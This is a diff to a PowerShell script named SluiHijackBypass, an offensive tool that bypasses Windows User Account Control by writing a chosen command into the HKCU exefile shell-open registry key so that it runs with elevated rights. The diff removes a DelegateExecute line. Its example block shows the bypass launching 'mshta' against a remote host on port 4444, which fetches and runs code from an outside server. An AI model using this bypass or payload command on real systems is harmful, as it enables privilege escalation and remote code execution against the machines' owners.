@@ -11,7 +11,7 @@
 .EXAMPLE
 	Load "cmd.exe" (By Default used 'arch 64'):
 	SluiHijackBypass -command "cmd.exe" -arch 64
-	
+
 	Load "mshta http://192.168.0.30:4444/0HUGN"
 	SluiHijackBypass -command "mshta http://192.168.0.30:4444/0HUGN"
 #>
@@ -27,7 +27,6 @@ function SluiHijackBypass(){
 
 	#Create registry structure
 	New-Item "HKCU:\Software\Classes\exefile\shell\open\command" -Force
-	New-ItemProperty -Path "HKCU:\Software\Classes\exefile\shell\open\command" -Name "DelegateExecute" -Value "" -Force
 	Set-ItemProperty -Path "HKCU:\Software\Classes\exefile\shell\open\command" -Name "(default)" -Value $command -Force
 
 	#Perform the bypass
